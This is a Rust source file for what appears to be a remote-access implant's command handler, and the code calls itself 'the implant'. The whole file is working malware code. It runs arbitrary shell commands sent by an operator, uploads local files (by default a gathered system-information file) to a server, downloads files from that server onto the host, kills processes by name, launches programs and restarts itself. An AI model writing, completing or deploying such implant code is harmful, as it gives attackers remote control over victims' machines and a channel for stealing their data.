use nix::sys::signal::{kill, Signal};
use nix::unistd::{execvp, fork, ForkResult, Pid};
use std::ffi::CString;
use std::path::Path;
use std::process::Command;
use uuid::Uuid;

use crate::commands::{download, upload};
use crate::sysinfo::saver::get_pids_by_name;

const DEFAULT_SYSINFO_FILE: &str = "sysinfo.dat";

/**
 * Function that determines the command type to be executed and executes it.
 */
pub async fn execute_command(
    uuid: Uuid,
    cmd: &str,
    upload_url: &str,
    download_url: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let cmd_parts = cmd.split_ascii_whitespace().collect::<Vec<&str>>();
    let cmd_type = cmd_parts.first().unwrap_or(&"");
    let mut output = String::new();

    match *cmd_type {
        // shell <shell commands>
        "shell" => output = execute_shell_command(cmd_parts)?,
        // upload <file_name>(optional)
        "upload" => output = execute_upload_command(uuid, cmd_parts, upload_url).await?,
        // download <file_id> <file_save_path>
        "download" => output = execute_download_command(uuid, cmd_parts, download_url).await?,
        // kill <process id or name>
        "killall" => output = execute_kill_command(cmd_parts)?,
        "start" => output = execute_start_command(cmd_parts)?,
        "restart" => output = execute_restart_command()?,
        _ => return Err(format!("Unsupported command type: {}", cmd_type).into()),
    }

    Ok(output)
}

/**
 * Function that executes shell commands.
 * Usage: ```shell <shell command>```
 * (e.g. ```shell whoami```)
 */
fn execute_shell_command(cmd_parts: Vec<&str>) -> Result<String, Box<dyn std::error::Error>> {
    if cmd_parts.len() <= 1 {
        println!("Could not execute shell command.");
        return Err(format!("Wrong number of parameters provided").into());
    }

    let shell_command = &cmd_parts[1..].join(" ");

    let output = Command::new("sh")
        .arg("-c")
        .arg(shell_command)
        .output()
        .map_err(|e| format!("Failed to execute process: {}", e))?;

    if output.status.success() {
        let output_str = String::from_utf8_lossy(&output.stdout);
        println!("Command output: {}", output_str);
        Ok(output_str.to_string())
    } else {
        let error_str = String::from_utf8_lossy(&output.stderr);
        println!("Command failed with error: {}", error_str);
        Ok(error_str.into())
    }
}

/**
 * Function to execute "upload" commands, will upload the default sysinfo file if the file name is not provided.
 * Usage: ```upload <filename>(optional)```
 * (e.g. ```upload rickroll.mp4```)
 */
async fn execute_upload_command(
    uuid: Uuid,
    cmd: Vec<&str>,
    file_url: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    println!("Executing upload command: {}", cmd.join(" "));
    let mut file_to_send = String::new();

    if cmd.len() == 1 {
        // default file is sent
        file_to_send = DEFAULT_SYSINFO_FILE.to_string();
    } else if cmd.len() == 2 {
        // given file is sent
        file_to_send = cmd.get(1).unwrap().to_string();
    } else {
        println!("Could not execute upload command.");
        return Err(format!("Wrong number of parameters provided").into());
    }
    if let Err(e) = upload::send_file(uuid, Path::new(&file_to_send), file_url).await {
        eprintln!("Error sending file: {}", e);
        return Err(e);
    }
    Ok(format!(
        "File '{}' was uploaded to the server.",
        file_to_send
    ))
}

/**
 * Function to execute "download" commands, file id and save path needs to be provided to the download command.
 * Usage: ```download <file name> <save path on host>```
 * (e.g. ```download rickroll.mp4 /home/user/Desktop```)
 */
async fn execute_download_command(
    uuid: Uuid,
    cmd: Vec<&str>,
    download_url: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    println!("Executing download command: {}", cmd.join(" "));

    if cmd.len() != 3 {
        println!("Could not execute download command.");
        return Err(format!("Wrong number of parameters provided").into());
    }
    let file_id = cmd.get(1).unwrap();
    let save_path = cmd.get(2).unwrap();

    if let Err(e) = download::receive_file(uuid, file_id, Path::new(save_path), download_url).await
    {
        eprintln!("Error receiving file: {}", e);
        return Err(e);
    }
    Ok(format!(
        "File with name '{}' was saved to '{}'.",
        file_id, save_path
    ))
}

/**
 * Function that kills processes with the given process id.
 * Usage: ```killall <process name>```
 * (e.g. ```killall ping```)
 */
fn execute_kill_command(cmd: Vec<&str>) -> Result<String, Box<dyn std::error::Error>> {
    if cmd.len() < 2 {
        return Err("Missing argument: process name".into());
    }

    let process_name = cmd[1];
    let pids = get_pids_by_name(process_name);

    if pids.is_empty() {
        return Err(format!("No processes found with name: {}", process_name).into());
    }

    for pid in pids {
        let pid = Pid::from_raw(pid);
        kill(pid, Signal::SIGKILL)?;
    }

    Ok(format!(
        "Successfully killed processes with name: {}",
        process_name
    ))
}

/**
 * Function that starts processes with given names, the command also allows giving arguments to the new process.
 * Usage: ```start <filename> <args>(optional)```
 * (e.g. ```start ping google.com```)  
 */
fn execute_start_command(cmd: Vec<&str>) -> Result<String, Box<dyn std::error::Error>> {
    if cmd.len() < 2 {
        return Err("Missing argument: command to start".into());
    }

    let command_to_start = cmd[1];

    let args: Vec<CString> = cmd[1..].iter().map(|&s| CString::new(s).unwrap()).collect();
    let c_command = CString::new(command_to_start).unwrap();

    match unsafe { fork()? } {
        ForkResult::Parent { .. } => Ok(format!(
            "Successfully started command: {}",
            command_to_start
        )),
        ForkResult::Child => {
            execvp(&c_command, &args)?;
            unreachable!()
        }
    }
}

/**
 * The function that adds restart functionality to the implant. The command does not take any arguments.
 * Usage: ```restart```
 */
fn execute_restart_command() -> Result<String, Box<dyn std::error::Error>> {
    // Get the current executable path
    let current_exe = std::env::current_exe()?;
    let exe_path = current_exe
        .to_str()
        .ok_or("Failed to get executable path")?;

    // Fork the current process
    match unsafe { fork()? } {
        ForkResult::Parent { .. } => {
            std::process::exit(0);
        }
        ForkResult::Child => {
            // Child process restarts the executable
            let c_exe_path = CString::new(exe_path)?;
            execvp(&c_exe_path, &[&c_exe_path])?;
            unreachable!()
        }
    }
}
